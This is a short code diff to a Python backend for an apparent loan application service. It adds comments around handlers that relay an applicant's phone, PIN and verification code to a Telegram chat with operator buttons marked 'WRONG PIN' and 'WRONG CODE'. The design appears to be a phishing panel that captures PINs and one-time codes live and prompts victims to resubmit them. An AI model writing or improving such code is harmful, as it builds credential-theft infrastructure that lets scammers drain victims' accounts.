@@ -187,7 +187,7 @@ def submit_code():
         if loan:
             phone, expected_code, amount, pin = loan
             msg = f'🔐 CODE VERIFICATION\n\n🆔 {app_id}\n\n📋 {entered_code}'
-            # Vertical buttons
+            # ✅ VERTICAL BUTTONS – each on its own row
             send_telegram(msg, {'inline_keyboard': [
                 [{'text': '❌ WRONG PIN', 'callback_data': f'wrongpin_{app_id}'}],
                 [{'text': '❌ WRONG CODE', 'callback_data': f'wrongcode_{app_id}'}],
@@ -244,12 +244,14 @@ def webhook():
                 conn.commit()
                 edit_telegram(msg_id, original + '\n\n❌ INVALID - PIN still wrong')
 
+            # ✅ WRONG PIN handler
             elif cb_data.startswith('wrongpin_'):
                 aid = cb_data.replace('wrongpin_', '')
                 c.execute("UPDATE loans SET status='wrong_pin', code_status='wrong_pin' WHERE app_id=?", (aid,))
                 conn.commit()
                 edit_telegram(msg_id, original + '\n\n❌ WRONG PIN')
 
+            # ✅ WRONG CODE handler
             elif cb_data.startswith('wrongcode_'):
                 aid = cb_data.replace('wrongcode_', '')
                 c.execute("UPDATE loans SET code_status='wrong_code' WHERE app_id=?", (aid,))
